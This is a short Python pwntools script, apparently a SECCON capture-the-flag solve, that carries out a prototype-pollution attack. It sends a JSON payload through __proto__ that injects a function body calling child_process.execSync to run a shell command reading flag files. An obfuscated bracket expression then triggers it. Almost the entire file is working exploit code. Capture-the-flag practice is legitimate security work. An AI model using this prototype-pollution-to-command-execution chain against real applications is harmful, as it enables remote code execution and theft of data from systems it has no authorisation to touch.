import pwn
import os
import json

pwn.context.log_level = "debug"


def connect() -> pwn.remote:
    return pwn.remote(
        os.getenv("SECCON_HOST", "localhost"), os.getenv("SECCON_PORT", "5000")
    )


command = "cat /flag-*.txt"

with connect() as io:
    io.sendlineafter(
        b"Input JSON: ",
        json.dumps(
            {
                "__proto__": {
                    "": "filter",
                    "filter": "constructor",
                    "function filter() { [native code] }": f"return global.process.mainModule.require('child_process').execSync('{command}').toString()",
                },
            }
        ).encode(),
    )
    io.sendlineafter(
        b"Input code: ",
        b"[][[][[]]][[][[]][[][[]]]]([][[][[][[]]]])()",
    )
    print(io.recvline().decode().strip())
